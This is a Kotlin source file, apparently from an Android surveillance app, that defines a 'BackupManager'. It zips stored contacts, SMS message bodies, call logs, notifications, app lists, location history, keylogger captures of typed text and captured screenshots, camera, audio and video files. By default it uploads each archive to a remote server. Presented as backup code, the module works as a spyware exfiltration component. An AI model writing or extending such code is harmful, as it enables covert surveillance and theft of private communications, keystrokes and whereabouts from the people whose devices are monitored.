package com.abuzahra.manager.storage

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.database.AbuZahraDatabase
import com.abuzahra.manager.database.entity.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * BackupManager - Handles data backup operations
 * Creates compressed backups of all data types
 */
object BackupManager {
    
    private const val TAG = "BackupManager"
    private const val BACKUP_VERSION = 1
    
    private lateinit var database: AbuZahraDatabase
    
    /**
     * Initialize backup manager
     */
    fun initialize(context: Context) {
        database = AbuZahraDatabase.getInstance(context)
    }
    
    /**
     * Backup types
     */
    enum class BackupType(val value: String) {
        FULL("full"),
        CONTACTS("contacts"),
        SMS("sms"),
        CALLS("calls"),
        NOTIFICATIONS("notifications"),
        APPS("apps"),
        LOCATION("location"),
        KEYLOG("keylog"),
        MEDIA("media")
    }
    
    /**
     * Create backup
     */
    suspend fun createBackup(
        context: Context,
        type: BackupType = BackupType.FULL,
        uploadToServer: Boolean = true
    ): BackupResult = withContext(Dispatchers.IO) {
        try {
            Log.i(TAG, "Creating backup: ${type.value}")
            
            val timestamp = System.currentTimeMillis()
            val dateStr = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date(timestamp))
            val fileName = "backup_${type.value}_$dateStr.zip"
            
            val backupDir = StorageManager.getDirectory(StorageManager.Dir.BACKUPS)
            val backupFile = File(backupDir, fileName)
            
            var itemCount = 0
            
            ZipOutputStream(backupFile.outputStream()).use { zipOut ->
                // Add manifest
                val manifest = createManifest(timestamp, type)
                addEntryToZip(zipOut, "manifest.json", manifest.toString())
                
                when (type) {
                    BackupType.FULL -> {
                        itemCount += backupContacts(zipOut)
                        itemCount += backupSms(zipOut)
                        itemCount += backupCalls(zipOut)
                        itemCount += backupNotifications(zipOut)
                        itemCount += backupApps(zipOut)
                        itemCount += backupLocations(zipOut)
                    }
                    BackupType.CONTACTS -> itemCount = backupContacts(zipOut)
                    BackupType.SMS -> itemCount = backupSms(zipOut)
                    BackupType.CALLS -> itemCount = backupCalls(zipOut)
                    BackupType.NOTIFICATIONS -> itemCount = backupNotifications(zipOut)
                    BackupType.APPS -> itemCount = backupApps(zipOut)
                    BackupType.LOCATION -> itemCount = backupLocations(zipOut)
                    BackupType.KEYLOG -> itemCount = backupKeylog(zipOut)
                    BackupType.MEDIA -> itemCount = backupMedia(zipOut)
                }
            }
            
            val checksum = StorageManager.calculateMD5(backupFile) ?: ""
            
            Log.i(TAG, "Backup created: ${backupFile.name}, items: $itemCount, size: ${backupFile.length()}")
            
            // Upload to server if requested
            var uploadSuccess = true
            if (uploadToServer) {
                uploadSuccess = uploadBackup(backupFile)
            }
            
            BackupResult(
                success = uploadSuccess,
                filePath = backupFile.absolutePath,
                fileName = backupFile.name,
                fileSize = backupFile.length(),
                itemCount = itemCount,
                checksum = checksum,
                timestamp = timestamp
            )
        } catch (e: Exception) {
            Log.e(TAG, "Backup failed", e)
            BackupResult(
                success = false,
                error = e.message ?: "Backup failed"
            )
        }
    }
    
    /**
     * Create manifest
     */
    private fun createManifest(timestamp: Long, type: BackupType): JSONObject {
        return JSONObject().apply {
            put("version", BACKUP_VERSION)
            put("type", type.value)
            put("timestamp", timestamp)
            put("deviceId", com.abuzahra.manager.util.DeviceUtils.getDeviceId(App.instance))
            put("appVersion", com.abuzahra.manager.App.APP_VERSION)
            put("created", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
        }
    }
    
    /**
     * Backup contacts
     */
    private suspend fun backupContacts(zipOut: ZipOutputStream): Int {
        val contacts = database.contactDao().getAll()
        if (contacts.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        contacts.forEach { contact ->
            jsonArray.put(JSONObject().apply {
                put("id", contact.contactId)
                put("name", contact.name)
                put("phone", contact.phoneNumber)
                put("email", contact.email)
                put("photoUri", contact.photoUri)
                put("starred", contact.starred)
            })
        }
        
        addEntryToZip(zipOut, "contacts.json", jsonArray.toString())
        return contacts.size
    }
    
    /**
     * Backup SMS
     */
    private suspend fun backupSms(zipOut: ZipOutputStream): Int {
        val messages = database.smsDao().getAll()
        if (messages.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        messages.forEach { sms ->
            jsonArray.put(JSONObject().apply {
                put("id", sms.messageId)
                put("address", sms.address)
                put("body", sms.body)
                put("date", sms.date)
                put("type", sms.type)
                put("read", sms.read)
            })
        }
        
        addEntryToZip(zipOut, "sms.json", jsonArray.toString())
        return messages.size
    }
    
    /**
     * Backup calls
     */
    private suspend fun backupCalls(zipOut: ZipOutputStream): Int {
        val calls = database.callDao().getAll()
        if (calls.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        calls.forEach { call ->
            jsonArray.put(JSONObject().apply {
                put("id", call.callId)
                put("number", call.number)
                put("date", call.date)
                put("duration", call.duration)
                put("type", call.type)
                put("name", call.name)
            })
        }
        
        addEntryToZip(zipOut, "calls.json", jsonArray.toString())
        return calls.size
    }
    
    /**
     * Backup notifications
     */
    private suspend fun backupNotifications(zipOut: ZipOutputStream): Int {
        val notifications = database.notificationDao().getAll()
        if (notifications.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        notifications.forEach { notif ->
            jsonArray.put(JSONObject().apply {
                put("package", notif.packageName)
                put("title", notif.title)
                put("text", notif.text)
                put("timestamp", notif.timestamp)
                put("category", notif.category)
            })
        }
        
        addEntryToZip(zipOut, "notifications.json", jsonArray.toString())
        return notifications.size
    }
    
    /**
     * Backup apps
     */
    private suspend fun backupApps(zipOut: ZipOutputStream): Int {
        val apps = database.appDao().getAll()
        if (apps.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        apps.forEach { app ->
            jsonArray.put(JSONObject().apply {
                put("package", app.packageName)
                put("name", app.appName)
                put("version", app.versionName)
                put("installTime", app.installTime)
                put("size", app.appSize)
                put("system", app.isSystemApp)
            })
        }
        
        addEntryToZip(zipOut, "apps.json", jsonArray.toString())
        return apps.size
    }
    
    /**
     * Backup locations
     */
    private suspend fun backupLocations(zipOut: ZipOutputStream): Int {
        val locations = database.locationDao().getAll()
        if (locations.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        locations.forEach { loc ->
            jsonArray.put(JSONObject().apply {
                put("lat", loc.latitude)
                put("lon", loc.longitude)
                put("accuracy", loc.accuracy)
                put("timestamp", loc.timestamp)
                put("provider", loc.provider)
            })
        }
        
        addEntryToZip(zipOut, "locations.json", jsonArray.toString())
        return locations.size
    }
    
    /**
     * Backup keylog
     */
    private suspend fun backupKeylog(zipOut: ZipOutputStream): Int {
        val entries = database.keylogDao().getAll()
        if (entries.isEmpty()) return 0
        
        val jsonArray = JSONArray()
        entries.forEach { entry ->
            jsonArray.put(JSONObject().apply {
                put("package", entry.packageName)
                put("text", entry.text)
                put("timestamp", entry.timestamp)
            })
        }
        
        addEntryToZip(zipOut, "keylog.json", jsonArray.toString())
        return entries.size
    }
    
    /**
     * Backup media files
     */
    private suspend fun backupMedia(zipOut: ZipOutputStream): Int {
        var count = 0
        
        listOf(
            StorageManager.Dir.SCREENSHOTS,
            StorageManager.Dir.CAMERA,
            StorageManager.Dir.AUDIO,
            StorageManager.Dir.VIDEO
        ).forEach { dirName ->
            StorageManager.listFiles(dirName).forEach { file ->
                try {
                    addFileToZip(zipOut, "media/${dirName}/${file.name}", file)
                    count++
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to backup media file: ${file.name}", e)
                }
            }
        }
        
        return count
    }
    
    /**
     * Add entry to zip
     */
    private fun addEntryToZip(zipOut: ZipOutputStream, name: String, content: String) {
        zipOut.putNextEntry(ZipEntry(name))
        zipOut.write(content.toByteArray(Charsets.UTF_8))
        zipOut.closeEntry()
    }
    
    /**
     * Add file to zip
     */
    private fun addFileToZip(zipOut: ZipOutputStream, name: String, file: File) {
        zipOut.putNextEntry(ZipEntry(name))
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var len: Int
            while (input.read(buffer).also { len = it } > 0) {
                zipOut.write(buffer, 0, len)
            }
        }
        zipOut.closeEntry()
    }
    
    /**
     * Upload backup to server
     */
    private suspend fun uploadBackup(file: File): Boolean {
        try {
            val response = ApiClient.uploadFile(file, "backup")
            val uploadSuccess = !response.contains("\"error\"")
            if (uploadSuccess) {
                Log.i(TAG, "Backup uploaded: ${file.name}")
            } else {
                Log.w(TAG, "Backup upload failed: $response")
            }
            return uploadSuccess
        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload backup", e)
            return false
        }
    }
    
    /**
     * Get backup history
     */
    fun getBackupHistory(): List<BackupInfo> {
        val backupDir = StorageManager.getDirectory(StorageManager.Dir.BACKUPS)
        return backupDir.listFiles()
            ?.filter { it.extension == "zip" }
            ?.map { file ->
                BackupInfo(
                    fileName = file.name,
                    filePath = file.absolutePath,
                    fileSize = file.length(),
                    createdAt = file.lastModified(),
                    type = extractBackupType(file.name)
                )
            }
            ?.sortedByDescending { it.createdAt }
            ?: emptyList()
    }
    
    /**
     * Extract backup type from filename
     */
    private fun extractBackupType(fileName: String): String {
        return try {
            val parts = fileName.split("_")
            if (parts.size >= 2) parts[1] else "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }
    
    /**
     * Delete old backups
     */
    fun deleteOldBackups(maxAgeDays: Int = 30): Int {
        return StorageManager.cleanOldFiles(StorageManager.Dir.BACKUPS, maxAgeDays)
    }
    
    /**
     * Get backup size
     */
    fun getBackupSize(): Long {
        val backupDir = StorageManager.getDirectory(StorageManager.Dir.BACKUPS)
        return StorageManager.calculateDirectorySize(backupDir)
    }
    
    data class BackupResult(
        val success: Boolean,
        val filePath: String? = null,
        val fileName: String? = null,
        val fileSize: Long = 0,
        val itemCount: Int = 0,
        val checksum: String = "",
        val timestamp: Long = 0,
        val error: String? = null
    )
    
    data class BackupInfo(
        val fileName: String,
        val filePath: String,
        val fileSize: Long,
        val createdAt: Long,
        val type: String
    )
}
